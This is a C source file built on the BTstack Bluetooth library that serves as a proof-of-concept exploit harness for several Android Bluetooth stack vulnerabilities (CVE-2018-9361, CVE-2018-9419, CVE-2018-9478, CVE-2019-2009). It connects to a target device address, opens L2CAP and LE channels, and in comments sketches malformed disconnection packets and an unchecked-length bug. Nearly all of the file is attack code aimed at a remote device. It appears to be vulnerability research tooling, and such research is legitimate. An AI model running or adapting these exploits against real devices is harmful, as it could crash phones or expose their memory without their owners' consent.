/**
 * SDP scan and connect to l2cap channels
 */

#define __BTSTACK_FILE__ "sdp_general_query.c"

#include "btstack_config.h"
#include "l2cap_signaling.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "l2cap.h"
#include "btstack.h"

bd_addr_t remote_addr;

int record_id = -1;
int attribute_id = -1;

static uint8_t attribute_value[1000];
static const int attribute_value_buffer_size = sizeof(attribute_value);
static btstack_packet_callback_registration_t hci_event_callback_registration;

static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size);
static void handle_sdp_client_query_result(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size);

static void client_init(void)
{
    // init L2CAP
    l2cap_init();

    // register for HCI events
    hci_event_callback_registration.callback = &packet_handler;
    hci_add_event_handler(&hci_event_callback_registration);
}

static void handle_sdp_client_query_result(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
    UNUSED(packet_type);
    UNUSED(channel);
    UNUSED(size);

    switch (packet[0])
    {
    case SDP_EVENT_QUERY_ATTRIBUTE_VALUE:
        printf("[*] SDP Event Query Attribute Value\n");
        break;
    case SDP_EVENT_QUERY_COMPLETE:
        if (sdp_event_query_complete_get_status(packet))
        {
            printf("[-] SDP query failed 0x%02x\n", sdp_event_query_complete_get_status(packet));
            break;
        }
        printf("SDP query done.\n");
        break;
    }
}

static void CVE_2018_9361_l2cap_handler(uint8_t packet_type, uint16_t l2cap_cid, uint8_t *packet, uint16_t size)
{
    printf("l2cap_packet_handler: packet_type[%d] l2cap_cid[%d]\n", packet_type, l2cap_cid);
}


static void do_CVE_2018_9361() {
    uint8_t status;
    // Not fully needed for CVE-2018-9361, we just need to get a connection started
    // TODO: Pull out the nessesary HCI commands that get run for creating a connection
    // and create a method to just trigger a HCI_EVENT_CONNECTION_COMPLETE
    // l2cap.c:l2cap_create_channel_entry -> hci_send_cmd(&hci_create_connection, channel->address, hci_usable_acl_packet_types(), 0, 0, 0, 1)
    // Need to hook into l2cap send loop
    status = l2cap_create_channel(CVE_2018_9361_l2cap_handler, remote_addr, BLUETOOTH_PROTOCOL_SDP, l2cap_max_mtu(), NULL);
    printf("Status: %d\n", status);
}

static void do_CVE_2018_9419() {
    uint8_t status = gap_connect(remote_addr, 0);
    printf("Status: %d\n", status);
}

static void do_CVE_2018_9478()
{
    uint8_t result = sdp_client_service_attribute_search_cve(
        &handle_sdp_client_query_result, remote_addr);
    printf("SDP query status: %d\n", result);
}

// https://android.googlesource.com/platform/system/bt/+/488aa8befd5bdffed6cfca7a399d2266ffd201fb%5E!/#F0
static void do_CVE_2019_2009() {
    uint8_t status = gap_connect(remote_addr, 1);
    printf("Status: %d\n", status);
}

static uint8_t data_channel_buffer[1024];
static void CVE_2019_2009_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size) {
    printf("Packet type: %d", packet_type);
}

static void packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
    UNUSED(channel);
    UNUSED(size);

    if (packet_type != HCI_EVENT_PACKET)
        return;
    uint8_t event = hci_event_packet_get_type(packet);

    uint16_t handle;
    switch (event)
    {
    case BTSTACK_EVENT_STATE:
        // BTstack activated, get started
        if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING)
        {
            do_CVE_2019_2009();
        }
        break;
    case HCI_EVENT_CONNECTION_COMPLETE:
        handle = hci_event_connection_complete_get_connection_handle(packet);
        printf("Connection complete (handle: %d)\n", handle);

        // CVE_2018_9361
        // There is additional code needed in l2cap_signaling.c for:
        // l2cap_send_signaling_packet( handle, DISCONNECTION_REQUEST_FUZZ,
        //    l2cap_next_sig_id());
    case HCI_EVENT_LE_META:
        if (hci_event_le_meta_get_subevent_code(packet) !=  HCI_SUBEVENT_LE_CONNECTION_COMPLETE) break;

        handle = hci_subevent_le_connection_complete_get_connection_handle(packet);

        // CVE_2018_9419 (similar to CVE-2018-9361)
        // l2cap_send_le_signaling_packet(handle, DISCONNECTION_REQUEST_FUZZ,
        //                                l2cap_next_sig_id(), 0xde, 0xfe);

        // CVE_2019_2009
        // https://android.googlesource.com/platform/system/bt/+/488aa8befd5bdffed6cfca7a399d2266ffd201fb%5E%21/#F0
        // does not check if p_buf->len < sizeof(sdu_length) (aka 2 bytes)
        l2cap_le_create_channel(&CVE_2019_2009_handler, handle, 0x2a, data_channel_buffer,
                                sizeof(data_channel_buffer), L2CAP_LE_AUTOMATIC_CREDITS, LEVEL_0, NULL);
    default:
        printf("packet_handler: 0x%x\n", event);
        break;
    }
}

int btstack_main(int argc, const char *argv[], bd_addr_t addr);
int btstack_main(int argc, const char *argv[], bd_addr_t addr)
{
    (void)argc;
    (void)argv;
    memcpy(remote_addr, addr, sizeof(bd_addr_t));

    printf("Client HCI init done\r\n");

    client_init();

    // turn on!
    hci_power_control(HCI_POWER_ON);

    return 0;
}
